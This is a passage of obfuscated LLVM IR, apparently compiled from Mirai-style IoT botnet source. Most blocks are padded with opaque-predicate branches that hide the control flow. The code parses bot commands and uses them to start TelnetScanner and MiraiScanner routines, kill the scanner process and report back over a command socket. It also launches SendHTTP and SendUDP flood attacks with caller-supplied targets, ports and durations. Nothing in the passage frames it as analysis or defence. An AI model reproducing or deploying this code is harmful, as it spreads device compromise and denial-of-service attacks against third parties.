  br i1 %161, label %162, label %180

; <label>:162:                                    ; preds = %158
  %163 = call i64 @time(i64* null) #5
  %164 = call i32 @getpid() #5
  %165 = sext i32 %164 to i64
  %166 = xor i64 %163, %165
  %167 = call i32 @getppid() #5
  %168 = sext i32 %167 to i64
  %169 = add nsw i64 %166, %168
  %170 = trunc i64 %169 to i32
  call void @srand(i32 %170) #5
  %171 = call i64 @time(i64* null) #5
  %172 = call i32 @getpid() #5
  %173 = sext i32 %172 to i64
  %174 = xor i64 %171, %173
  %175 = trunc i64 %174 to i32
  call void @init_rand(i32 %175)
  %176 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %176)
  call void @_exit(i32 0) #11
  unreachable
                                                  ; No predecessors!
  %178 = load i32, i32* %6, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %6, align 4
  br label %158

; <label>:180:                                    ; preds = %158
  br label %181

; <label>:181:                                    ; preds = %180, %originalBBpart24
  %182 = load i8**, i8*** %4, align 8
  %183 = getelementptr inbounds i8*, i8** %182, i64 1
  %184 = load i8*, i8** %183, align 8
  %185 = call i32 @strcmp(i8* %184, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.513, i32 0, i32 0)) #9
  %186 = icmp ne i32 %185, 0
  br i1 %186, label %210, label %187

; <label>:187:                                    ; preds = %181
  %188 = load i32, i32* @scanPid, align 4
  %189 = icmp eq i32 %188, 0
  br i1 %189, label %190, label %207

; <label>:190:                                    ; preds = %187
  %191 = load i32, i32* @x.85
  %192 = load i32, i32* @y.86
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %190
  %199 = load i32, i32* @x.85
  %200 = load i32, i32* @y.86
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %1273

; <label>:207:                                    ; preds = %187
  %208 = load i32, i32* @scanPid, align 4
  %209 = call i32 @kill(i32 %208, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %210

; <label>:210:                                    ; preds = %207, %181
  %211 = load i8**, i8*** %4, align 8
  %212 = getelementptr inbounds i8*, i8** %211, i64 1
  %213 = load i8*, i8** %212, align 8
  %214 = call i32 @strcmp(i8* %213, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.514, i32 0, i32 0)) #9
  %215 = icmp ne i32 %214, 0
  br i1 %215, label %249, label %216

; <label>:216:                                    ; preds = %210
  %217 = load i8**, i8*** %4, align 8
  %218 = getelementptr inbounds i8*, i8** %217, i64 1
  %219 = load i8*, i8** %218, align 8
  %220 = call i32 @atoi(i8* %219) #9
  store i32 %220, i32* %9, align 4
  %221 = load i8**, i8*** %4, align 8
  %222 = getelementptr inbounds i8*, i8** %221, i64 2
  %223 = load i8*, i8** %222, align 8
  %224 = call i32 @atoi(i8* %223) #9
  store i32 %224, i32* %10, align 4
  %225 = call i32 @listFork()
  %226 = icmp ne i32 %225, 0
  br i1 %226, label %248, label %227

; <label>:227:                                    ; preds = %216
  %228 = load i32, i32* @x.85
  %229 = load i32, i32* @y.86
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %227
  %236 = load i32, i32* @mainCommSock, align 4
  %237 = call i32 (i32, i8*, ...) @sockprintf(i32 %236, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.515, i32 0, i32 0))
  %238 = load i32, i32* %10, align 4
  %239 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %238, i32 %239)
  call void @_exit(i32 0) #11
  %240 = load i32, i32* @x.85
  %241 = load i32, i32* @y.86
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  unreachable

; <label>:248:                                    ; preds = %216
  br label %1273

; <label>:249:                                    ; preds = %210
  %250 = load i32, i32* @x.85
  %251 = load i32, i32* @y.86
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %249
  %258 = load i32, i32* @x.85
  %259 = load i32, i32* @y.86
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %266

; <label>:266:                                    ; preds = %originalBBpart228, %originalBBpart2
  %267 = load i32, i32* @x.85
  %268 = load i32, i32* @y.86
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %266
  %275 = load i8**, i8*** %4, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 0
  %277 = load i8*, i8** %276, align 8
  %278 = call i32 @strcmp(i8* %277, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.516, i32 0, i32 0)) #9
  %279 = icmp ne i32 %278, 0
  %280 = load i32, i32* @x.85
  %281 = load i32, i32* @y.86
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %279, label %488, label %288

; <label>:288:                                    ; preds = %originalBBpart232
  %289 = load i32, i32* @x.85
  %290 = load i32, i32* @y.86
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %288
  %297 = load i8**, i8*** %4, align 8
  %298 = getelementptr inbounds i8*, i8** %297, i64 1
  %299 = load i8*, i8** %298, align 8
  %300 = call i32 @strcmp(i8* %299, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.512, i32 0, i32 0)) #9
  %301 = icmp ne i32 %300, 0
  %302 = load i32, i32* @x.85
  %303 = load i32, i32* @y.86
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %301, label %419, label %310

; <label>:310:                                    ; preds = %originalBBpart236
  %311 = call i32 @fork() #5
  store i32 %311, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %312 = call i64 @sysconf(i32 84) #5
  %313 = trunc i64 %312 to i32
  store i32 %313, i32* %13, align 4
  store i32 999999, i32* %14, align 4
  %314 = load i32, i32* %13, align 4
  %315 = icmp eq i32 %314, 1
  br i1 %315, label %316, label %317

; <label>:316:                                    ; preds = %310
  store i32 500, i32* %14, align 4
  br label %317

; <label>:317:                                    ; preds = %316, %310
  %318 = load i32, i32* %13, align 4
  %319 = icmp sge i32 %318, 2
  br i1 %319, label %320, label %321

; <label>:320:                                    ; preds = %317
  store i32 1000, i32* %14, align 4
  br label %321

; <label>:321:                                    ; preds = %320, %317
  %322 = load i32, i32* %11, align 4
  %323 = icmp ugt i32 %322, 0
  br i1 %323, label %324, label %342

; <label>:324:                                    ; preds = %321
  %325 = load i32, i32* @x.85
  %326 = load i32, i32* @y.86
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %324
  %333 = load i32, i32* %11, align 4
  store i32 %333, i32* @scanPid, align 4
  %334 = load i32, i32* @x.85
  %335 = load i32, i32* @y.86
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %1273

; <label>:342:                                    ; preds = %321
  %343 = load i32, i32* @x.85
  %344 = load i32, i32* @y.86
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %342
  %351 = load i32, i32* %11, align 4
  %352 = icmp eq i32 %351, -1
  %353 = load i32, i32* @x.85
  %354 = load i32, i32* @y.86
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %352, label %361, label %362

; <label>:361:                                    ; preds = %originalBBpart244
  br label %1273

; <label>:362:                                    ; preds = %originalBBpart244
  %363 = load i32, i32* @x.85
  %364 = load i32, i32* @y.86
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %362
  %371 = load i32, i32* @x.85
  %372 = load i32, i32* @y.86
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %379

; <label>:379:                                    ; preds = %originalBBpart248
  store i32 0, i32* %12, align 4
  br label %380

; <label>:380:                                    ; preds = %415, %379
  %381 = load i32, i32* %12, align 4
  %382 = load i32, i32* %13, align 4
  %383 = icmp slt i32 %381, %382
  br i1 %383, label %384, label %418

; <label>:384:                                    ; preds = %380
  %385 = load i32, i32* @x.85
  %386 = load i32, i32* @y.86
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %384
  %393 = call i64 @time(i64* null) #5
  %394 = call i32 @getpid() #5
  %395 = sext i32 %394 to i64
  %396 = xor i64 %393, %395
  %397 = call i32 @getppid() #5
  %398 = sext i32 %397 to i64
  %399 = add nsw i64 %396, %398
  %400 = trunc i64 %399 to i32
  call void @srand(i32 %400) #5
  %401 = call i64 @time(i64* null) #5
  %402 = call i32 @getpid() #5
  %403 = sext i32 %402 to i64
  %404 = xor i64 %401, %403
  %405 = trunc i64 %404 to i32
  call void @init_rand(i32 %405)
  %406 = load i32, i32* %14, align 4
  call void @MiraiScanner(i32 100, i32 %406)
  call void @_exit(i32 0) #11
  %407 = load i32, i32* @x.85
  %408 = load i32, i32* @y.86
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBBpart264, label %originalBB50alteredBB

originalBBpart264:                                ; preds = %originalBB50
  unreachable
                                                  ; No predecessors!
  %416 = load i32, i32* %12, align 4
  %417 = add nsw i32 %416, 1
  store i32 %417, i32* %12, align 4
  br label %380

; <label>:418:                                    ; preds = %380
  br label %419

; <label>:419:                                    ; preds = %418, %originalBBpart236
  %420 = load i32, i32* @x.85
  %421 = load i32, i32* @y.86
  %422 = sub i32 %420, 1
  %423 = mul i32 %420, %422
  %424 = urem i32 %423, 2
  %425 = icmp eq i32 %424, 0
  %426 = icmp slt i32 %421, 10
  %427 = or i1 %425, %426
  br i1 %427, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %419
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 1
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @strcmp(i8* %430, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.513, i32 0, i32 0)) #9
  %432 = icmp ne i32 %431, 0
  %433 = load i32, i32* @x.85
  %434 = load i32, i32* @y.86
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %432, label %448, label %441

; <label>:441:                                    ; preds = %originalBBpart268
  %442 = load i32, i32* @scanPid, align 4
  %443 = icmp eq i32 %442, 0
  br i1 %443, label %444, label %445

; <label>:444:                                    ; preds = %441
  br label %1273

; <label>:445:                                    ; preds = %441
  %446 = load i32, i32* @scanPid, align 4
  %447 = call i32 @kill(i32 %446, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %448

; <label>:448:                                    ; preds = %445, %originalBBpart268
  %449 = load i8**, i8*** %4, align 8
  %450 = getelementptr inbounds i8*, i8** %449, i64 1
  %451 = load i8*, i8** %450, align 8
  %452 = call i32 @strcmp(i8* %451, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.514, i32 0, i32 0)) #9
  %453 = icmp ne i32 %452, 0
  br i1 %453, label %487, label %454

; <label>:454:                                    ; preds = %448
  %455 = load i8**, i8*** %4, align 8
  %456 = getelementptr inbounds i8*, i8** %455, i64 1
  %457 = load i8*, i8** %456, align 8
  %458 = call i32 @atoi(i8* %457) #9
  store i32 %458, i32* %15, align 4
  %459 = load i8**, i8*** %4, align 8
  %460 = getelementptr inbounds i8*, i8** %459, i64 2
  %461 = load i8*, i8** %460, align 8
  %462 = call i32 @atoi(i8* %461) #9
  store i32 %462, i32* %16, align 4
  %463 = call i32 @listFork()
  %464 = icmp ne i32 %463, 0
  br i1 %464, label %470, label %465

; <label>:465:                                    ; preds = %454
  %466 = load i32, i32* @mainCommSock, align 4
  %467 = call i32 (i32, i8*, ...) @sockprintf(i32 %466, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.517, i32 0, i32 0))
  %468 = load i32, i32* %16, align 4
  %469 = load i32, i32* %15, align 4
  call void @MiraiScanner(i32 %468, i32 %469)
  call void @_exit(i32 0) #11
  unreachable

; <label>:470:                                    ; preds = %454
  %471 = load i32, i32* @x.85
  %472 = load i32, i32* @y.86
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %470
  %479 = load i32, i32* @x.85
  %480 = load i32, i32* @y.86
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %1273

; <label>:487:                                    ; preds = %448
  br label %488

; <label>:488:                                    ; preds = %487, %originalBBpart232
  %489 = load i8**, i8*** %4, align 8
  %490 = getelementptr inbounds i8*, i8** %489, i64 0
  %491 = load i8*, i8** %490, align 8
  %492 = call i32 @strcmp(i8* %491, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.518, i32 0, i32 0)) #9
  %493 = icmp ne i32 %492, 0
  br i1 %493, label %553, label %494

; <label>:494:                                    ; preds = %488
  %495 = load i32, i32* @x.85
  %496 = load i32, i32* @y.86
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %494
  %503 = load i32, i32* %3, align 4
  %504 = icmp slt i32 %503, 6
  %505 = load i32, i32* @x.85
  %506 = load i32, i32* @y.86
  %507 = sub i32 %505, 1
  %508 = mul i32 %505, %507
  %509 = urem i32 %508, 2
  %510 = icmp eq i32 %509, 0
  %511 = icmp slt i32 %506, 10
  %512 = or i1 %510, %511
  br i1 %512, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %504, label %525, label %513

; <label>:513:                                    ; preds = %originalBBpart276
  %514 = load i8**, i8*** %4, align 8
  %515 = getelementptr inbounds i8*, i8** %514, i64 3
  %516 = load i8*, i8** %515, align 8
  %517 = call i32 @atoi(i8* %516) #9
  %518 = icmp slt i32 %517, 1
  br i1 %518, label %525, label %519

; <label>:519:                                    ; preds = %513
  %520 = load i8**, i8*** %4, align 8
  %521 = getelementptr inbounds i8*, i8** %520, i64 5
  %522 = load i8*, i8** %521, align 8
  %523 = call i32 @atoi(i8* %522) #9
  %524 = icmp slt i32 %523, 1
  br i1 %524, label %525, label %526

; <label>:525:                                    ; preds = %519, %513, %originalBBpart276
  br label %1273

; <label>:526:                                    ; preds = %519
  %527 = call i32 @listFork()
  %528 = icmp ne i32 %527, 0
  br i1 %528, label %529, label %530

; <label>:529:                                    ; preds = %526
  br label %1273

; <label>:530:                                    ; preds = %526
  %531 = load i8**, i8*** %4, align 8
  %532 = getelementptr inbounds i8*, i8** %531, i64 1
  %533 = load i8*, i8** %532, align 8
  %534 = load i8**, i8*** %4, align 8
  %535 = getelementptr inbounds i8*, i8** %534, i64 2
  %536 = load i8*, i8** %535, align 8
  %537 = load i8**, i8*** %4, align 8
  %538 = getelementptr inbounds i8*, i8** %537, i64 3
  %539 = load i8*, i8** %538, align 8
  %540 = call i32 @atoi(i8* %539) #9
  %541 = trunc i32 %540 to i16
  %542 = load i8**, i8*** %4, align 8
  %543 = getelementptr inbounds i8*, i8** %542, i64 4
  %544 = load i8*, i8** %543, align 8
  %545 = load i8**, i8*** %4, align 8
  %546 = getelementptr inbounds i8*, i8** %545, i64 5
  %547 = load i8*, i8** %546, align 8
  %548 = call i32 @atoi(i8* %547) #9
  %549 = load i8**, i8*** %4, align 8
  %550 = getelementptr inbounds i8*, i8** %549, i64 6
  %551 = load i8*, i8** %550, align 8
  %552 = call i32 @atoi(i8* %551) #9
  call void @SendHTTP(i8* %533, i8* %536, i16 zeroext %541, i8* %544, i32 %548, i32 %552)
  call void @exit(i32 0) #12
  unreachable

; <label>:553:                                    ; preds = %488
  %554 = load i8**, i8*** %4, align 8
  %555 = getelementptr inbounds i8*, i8** %554, i64 0
  %556 = load i8*, i8** %555, align 8
  %557 = call i32 @strcmp(i8* %556, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.519, i32 0, i32 0)) #9
  %558 = icmp ne i32 %557, 0
  br i1 %558, label %736, label %559

; <label>:559:                                    ; preds = %553
  %560 = load i32, i32* %3, align 4
  %561 = icmp slt i32 %560, 6
  br i1 %561, label %611, label %562

; <label>:562:                                    ; preds = %559
  %563 = load i8**, i8*** %4, align 8
  %564 = getelementptr inbounds i8*, i8** %563, i64 3
  %565 = load i8*, i8** %564, align 8
  %566 = call i32 @atoi(i8* %565) #9
  %567 = icmp eq i32 %566, -1
  br i1 %567, label %611, label %568

; <label>:568:                                    ; preds = %562
  %569 = load i8**, i8*** %4, align 8
  %570 = getelementptr inbounds i8*, i8** %569, i64 2
  %571 = load i8*, i8** %570, align 8
  %572 = call i32 @atoi(i8* %571) #9
  %573 = icmp eq i32 %572, -1
  br i1 %573, label %611, label %574

; <label>:574:                                    ; preds = %568
  %575 = load i8**, i8*** %4, align 8
  %576 = getelementptr inbounds i8*, i8** %575, i64 4
  %577 = load i8*, i8** %576, align 8
  %578 = call i32 @atoi(i8* %577) #9
  %579 = icmp eq i32 %578, -1
  br i1 %579, label %611, label %580

; <label>:580:                                    ; preds = %574
  %581 = load i8**, i8*** %4, align 8
  %582 = getelementptr inbounds i8*, i8** %581, i64 4
  %583 = load i8*, i8** %582, align 8
  %584 = call i32 @atoi(i8* %583) #9
  %585 = icmp sgt i32 %584, 1024
  br i1 %585, label %611, label %586

; <label>:586:                                    ; preds = %580
  %587 = load i32, i32* %3, align 4
  %588 = icmp eq i32 %587, 6
  br i1 %588, label %589, label %612

; <label>:589:                                    ; preds = %586
  %590 = load i32, i32* @x.85
  %591 = load i32, i32* @y.86
  %592 = sub i32 %590, 1
  %593 = mul i32 %590, %592
  %594 = urem i32 %593, 2
  %595 = icmp eq i32 %594, 0
  %596 = icmp slt i32 %591, 10
  %597 = or i1 %595, %596
  br i1 %597, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %589
  %598 = load i8**, i8*** %4, align 8
  %599 = getelementptr inbounds i8*, i8** %598, i64 5
  %600 = load i8*, i8** %599, align 8
  %601 = call i32 @atoi(i8* %600) #9
  %602 = icmp slt i32 %601, 1
  %603 = load i32, i32* @x.85
  %604 = load i32, i32* @y.86
  %605 = sub i32 %603, 1
  %606 = mul i32 %603, %605
  %607 = urem i32 %606, 2
  %608 = icmp eq i32 %607, 0
  %609 = icmp slt i32 %604, 10
  %610 = or i1 %608, %609
  br i1 %610, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %602, label %611, label %612

; <label>:611:                                    ; preds = %originalBBpart280, %580, %574, %568, %562, %559
  br label %1273

; <label>:612:                                    ; preds = %originalBBpart280, %586
  %613 = load i8**, i8*** %4, align 8
  %614 = getelementptr inbounds i8*, i8** %613, i64 1
  %615 = load i8*, i8** %614, align 8
  store i8* %615, i8** %17, align 8
  %616 = load i8**, i8*** %4, align 8
  %617 = getelementptr inbounds i8*, i8** %616, i64 2
  %618 = load i8*, i8** %617, align 8
  %619 = call i32 @atoi(i8* %618) #9
  store i32 %619, i32* %18, align 4
  %620 = load i8**, i8*** %4, align 8
  %621 = getelementptr inbounds i8*, i8** %620, i64 3
  %622 = load i8*, i8** %621, align 8
  %623 = call i32 @atoi(i8* %622) #9
  store i32 %623, i32* %19, align 4
  %624 = load i8**, i8*** %4, align 8
  %625 = getelementptr inbounds i8*, i8** %624, i64 4
  %626 = load i8*, i8** %625, align 8
  %627 = call i32 @atoi(i8* %626) #9
  store i32 %627, i32* %20, align 4
  %628 = load i32, i32* %3, align 4
  %629 = icmp eq i32 %628, 6
  br i1 %629, label %630, label %635

; <label>:630:                                    ; preds = %612
  %631 = load i8**, i8*** %4, align 8
  %632 = getelementptr inbounds i8*, i8** %631, i64 5
  %633 = load i8*, i8** %632, align 8
  %634 = call i32 @atoi(i8* %633) #9
  br label %636

; <label>:635:                                    ; preds = %612
  br label %636

; <label>:636:                                    ; preds = %635, %630
  %637 = phi i32 [ %634, %630 ], [ 10, %635 ]
  store i32 %637, i32* %21, align 4
  store i32 32, i32* %22, align 4
  %638 = load i8*, i8** %17, align 8
  %639 = call i8* @strstr(i8* %638, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #9
  %640 = icmp ne i8* %639, null
  br i1 %640, label %641, label %708

; <label>:641:                                    ; preds = %636
  %642 = load i32, i32* @x.85
  %643 = load i32, i32* @y.86
  %644 = sub i32 %642, 1
  %645 = mul i32 %642, %644
  %646 = urem i32 %645, 2
  %647 = icmp eq i32 %646, 0
  %648 = icmp slt i32 %643, 10
  %649 = or i1 %647, %648
  br i1 %649, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %641
  %650 = load i8*, i8** %17, align 8
  %651 = call i8* @strtok(i8* %650, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %651, i8** %23, align 8
  %652 = load i32, i32* @x.85
  %653 = load i32, i32* @y.86
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %660

; <label>:660:                                    ; preds = %705, %originalBBpart284
  %661 = load i32, i32* @x.85
  %662 = load i32, i32* @y.86
  %663 = sub i32 %661, 1
  %664 = mul i32 %661, %663
  %665 = urem i32 %664, 2
  %666 = icmp eq i32 %665, 0
  %667 = icmp slt i32 %662, 10
  %668 = or i1 %666, %667
  br i1 %668, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %660
  %669 = load i8*, i8** %23, align 8
  %670 = icmp ne i8* %669, null
  %671 = load i32, i32* @x.85
  %672 = load i32, i32* @y.86
  %673 = sub i32 %671, 1
  %674 = mul i32 %671, %673
  %675 = urem i32 %674, 2
  %676 = icmp eq i32 %675, 0
  %677 = icmp slt i32 %672, 10
  %678 = or i1 %676, %677
  br i1 %678, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %670, label %679, label %707

; <label>:679:                                    ; preds = %originalBBpart288
  %680 = load i32, i32* @x.85
  %681 = load i32, i32* @y.86
  %682 = sub i32 %680, 1
  %683 = mul i32 %680, %682
  %684 = urem i32 %683, 2
  %685 = icmp eq i32 %684, 0
  %686 = icmp slt i32 %681, 10
  %687 = or i1 %685, %686
  br i1 %687, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %679
  %688 = call i32 @listFork()
  %689 = icmp ne i32 %688, 0
  %690 = load i32, i32* @x.85
  %691 = load i32, i32* @y.86
  %692 = sub i32 %690, 1
  %693 = mul i32 %690, %692
  %694 = urem i32 %693, 2
  %695 = icmp eq i32 %694, 0
  %696 = icmp slt i32 %691, 10
  %697 = or i1 %695, %696
  br i1 %697, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %689, label %705, label %698

; <label>:698:                                    ; preds = %originalBBpart292
  %699 = load i8*, i8** %23, align 8
  %700 = load i32, i32* %18, align 4
  %701 = load i32, i32* %19, align 4
  %702 = load i32, i32* %20, align 4
  %703 = load i32, i32* %21, align 4
  %704 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %699, i32 %700, i32 %701, i32 %702, i32 %703, i32 %704)
  call void @_exit(i32 0) #11
  unreachable

; <label>:705:                                    ; preds = %originalBBpart292
  %706 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %706, i8** %23, align 8
  br label %660

; <label>:707:                                    ; preds = %originalBBpart288
  br label %735

; <label>:708:                                    ; preds = %636
  %709 = call i32 @listFork()
  %710 = icmp ne i32 %709, 0
  br i1 %710, label %711, label %712

; <label>:711:                                    ; preds = %708
  br label %1273

; <label>:712:                                    ; preds = %708
  %713 = load i32, i32* @x.85
  %714 = load i32, i32* @y.86
  %715 = sub i32 %713, 1
  %716 = mul i32 %713, %715
  %717 = urem i32 %716, 2
  %718 = icmp eq i32 %717, 0
  %719 = icmp slt i32 %714, 10
  %720 = or i1 %718, %719
  br i1 %720, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %712
  %721 = load i8*, i8** %17, align 8
  %722 = load i32, i32* %18, align 4
  %723 = load i32, i32* %19, align 4
  %724 = load i32, i32* %20, align 4
  %725 = load i32, i32* %21, align 4
  %726 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %721, i32 %722, i32 %723, i32 %724, i32 %725, i32 %726)
  call void @_exit(i32 0) #11
  %727 = load i32, i32* @x.85
  %728 = load i32, i32* @y.86
  %729 = sub i32 %727, 1
  %730 = mul i32 %727, %729
  %731 = urem i32 %730, 2
  %732 = icmp eq i32 %731, 0
  %733 = icmp slt i32 %728, 10
  %734 = or i1 %732, %733
